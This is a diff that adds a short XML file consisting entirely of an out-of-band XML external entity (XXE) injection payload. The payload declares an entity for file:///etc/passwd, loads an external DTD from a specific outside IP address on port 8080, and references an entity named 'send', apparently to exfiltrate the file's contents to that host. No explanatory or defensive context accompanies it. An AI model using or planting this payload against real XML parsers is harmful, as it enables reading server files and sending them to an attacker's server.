@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM
+  "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM
+  "http://13.59.183.117:8080/weyer.dtd">
+  %dtd;
+]>
+<data>&send;</data>
+
